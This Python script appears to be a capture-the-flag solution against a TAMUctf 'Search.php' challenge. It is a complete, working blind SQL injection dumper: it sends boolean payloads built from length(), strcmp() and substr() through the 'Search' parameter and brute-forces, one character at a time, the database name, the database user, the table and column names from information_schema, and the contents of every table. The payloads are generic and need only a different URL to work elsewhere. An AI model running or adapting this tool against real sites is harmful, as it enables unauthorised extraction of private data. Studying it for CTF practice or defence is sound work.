#!/usr/bin/env python
import requests
import string
import sys

URL           = "http://web2.tamuctf.com/Search.php"
HEADERS       = {}
TRUE_QUERY    = "Eggs"

def getPayload(payload):
    params = {'Search': 'Eggs' + payload}
    res = requests.get(URL, headers=HEADERS, params=params)
    return res.text

def dbQueryLen(payload, *args):
    l = 0    
    while(True):
        payload1 = payload % (args+(l,))
        res = getPayload(payload1)

        if TRUE_QUERY in res:
            return l
        l += 1

def dbQueryStr(payload, len, data_flag, *args):
    s = ''
    # Case sensitive cmp needed only for column data
    if data_flag:
        charset = string.letters+string.digits+'_-{}@'
    else:
        charset = string.ascii_lowercase+string.digits+'_-'

    for i in xrange(1, len+1):
        for c in (charset):
            payload1 = payload % (args+(i, c,))
            res = getPayload(payload1)

            if TRUE_QUERY in res:
                s += c
                sys.stdout.flush()
                sys.stdout.write(s+'\r')
                break
    return s

def getDBName():
    payloadDBLen = "' and length(database())=%i -- -"
    payloadDBName = "' and strcmp(substr(database(),%i,1), '%c') = 0 -- -"

    # get db name length
    dbNameLen = dbQueryLen(payloadDBLen)
    
    # get db name
    dbName = dbQueryStr(payloadDBName, dbNameLen, 0)
    print "DB Name: %s" % dbName

    return dbName

def getUserName():
    payloadUserLen = "' and length(user())=%i -- -"
    payloadUserName = "' and strcmp(substr(user(),%i,1), '%c') = 0 -- -"

    # get db name length
    dbUserLen = dbQueryLen(payloadUserLen)
    
    # get db name
    dbUserName = dbQueryStr(payloadUserName, dbUserLen, 1)
    print "User Name: %s" % dbUserName

    return dbUserName

def getDBTables():
    dbTables = {}
    payloadTblCount = "' and (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=%i -- -"
    payloadTblNameLen  = "' and (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT %i,1)=%i -- -"
    payloadTblName = "' and strcmp(BINARY substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT %i,1), %i, 1), '%c') = 0 -- -"

    # get table count    
    tblCount = dbQueryLen(payloadTblCount)
    print "Table count: %i" % tblCount

    # get table names, return dict of tables
    for count in xrange(tblCount):

        tblNameLen = dbQueryLen(payloadTblNameLen, count) 

        s = dbQueryStr(payloadTblName, tblNameLen, 1, count)
        dbTables[s] = []
        print "Table %i: '%s'" % (count+1, s)
    
    return dbTables

def getDBColumns(dbTables):
    payloadColCount = "' and (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='%s')=%i -- -"
    payloadColNameLen = "' and (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name='%s' LIMIT %i,1)=%i -- -"
    payloadColName = "' and strcmp(substr((SELECT column_name FROM information_schema.columns WHERE table_schema=database() and table_name='%s' LIMIT %i,1), %i, 1), '%c') = 0 -- -"

    for tbl in dbTables.keys():

        dbTables[tbl].append([])
        colCount = dbQueryLen(payloadColCount, tbl)
        print "Table '%s' - Column count: %i" % (tbl, colCount)

        for count in xrange(colCount):
            colNameLen = dbQueryLen(payloadColNameLen, tbl, count)

            s = dbQueryStr(payloadColName, colNameLen, 0, tbl, count)
            print "Table '%s' - Column %i: '%s'" %(tbl, count+1, s) 
            dbTables[tbl][0].append(s)
    
    return dbTables

def getDBData(dbTables):
    payloadRowCount = "' and (SELECT COUNT(*) FROM %s)=%i -- -"
    payloadDataLen = "' and (SELECT LENGTH(%s) FROM %s LIMIT %i,1)=%i -- -"
    payloadDataVal = "' and strcmp(BINARY substr((SELECT %s FROM %s LIMIT %i,1), %i, 1), '%c') = 0 -- -"

    for tbl, cols in dbTables.items():
        
        rowCount = dbQueryLen(payloadRowCount, tbl)
        print "Table '%s' - Row count: %i" % (tbl, rowCount)

        for count in xrange(0,rowCount):
            dbTables[tbl].append([])
            for col in cols[0]:    
                valLen = dbQueryLen(payloadDataLen, col, tbl, count)
                s = dbQueryStr(payloadDataVal, valLen, 1, col, tbl, count)
                print "Table '%s' - Row %i - '%s': %s" %(tbl, count+1, col, s)
                dbTables[tbl][count+1].append(s)

    return dbTables

def printDBData(dbTables):
    for tbl, rows in dbTables.items():
        header = 1
        colCount = len(dbTables[tbl][0])
        rowWidth = [0]*colCount

        for rows in dbTables[tbl]:
            rowWidth = [max(len(a),rowWidth[b]) for a,b in zip(rows, xrange(colCount))]
        
        tblWidth = sum(rowWidth)-1+colCount*3

        print "\n Table : " + tbl
        print ' '+'-' * tblWidth
        for rows in dbTables[tbl]:
            for val,w in zip(rows, rowWidth):
                print "| " + val.ljust(w),
            print '|'
            if header:
                print ' '+'-' * tblWidth
                header = 0
        print ' '+'-' * tblWidth


if __name__ == "__main__":

    print "[+] Get DB Name"
    dbName = getDBName()

    print "[+] Get User Name"
    dbName = getUserName()

    print "\n[+] Get Tables Name"
    dbTables = getDBTables()

    print "\n[+] Get Columns Name"
    dbTables = getDBColumns(dbTables)

    print "\n[+] Get Columns Data"
    dbTables = getDBData(dbTables)

    print "\n[+] Print DB Data"
    printDBData(dbTables)